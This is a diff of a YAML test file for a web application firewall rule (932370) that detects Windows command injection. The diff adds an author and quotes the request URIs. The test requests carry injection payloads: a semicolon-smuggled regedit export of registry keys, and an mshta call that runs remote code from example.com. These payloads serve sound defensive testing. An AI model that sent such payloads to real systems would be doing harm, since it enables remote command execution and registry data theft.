@@ -1,6 +1,6 @@
 ---
 meta:
-  author: airween, Franziska Bühler
+  author: "airween, Franziska Bühler, azurit"
   description: "Remote Command Execution: Windows Command Injection test cases"
   enabled: true
   name: 932370.yaml
@@ -18,7 +18,7 @@ tests:
             method: GET
             port: 80
             # "cmd=; regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey"
-            uri: /get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey
+            uri: "/get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey"
             version: HTTP/1.0
           output:
             log_contains: id "932370"
@@ -35,7 +35,7 @@ tests:
             method: GET
             port: 80
             # "cmd=regedit "
-            uri: /get?cmd=regedit%20
+            uri: "/get?cmd=regedit%20"
             version: HTTP/1.0
           output:
             no_log_contains: id "932370"
@@ -52,7 +52,7 @@ tests:
             method: GET
             port: 80
             # "cmd=; mshta http://example.com"
-            uri: /get?cmd=;%20mshta%20http://example.com
+            uri: "/get?cmd=;%20mshta%20http://example.com"
             version: HTTP/1.0
           output:
             log_contains: id "932370"
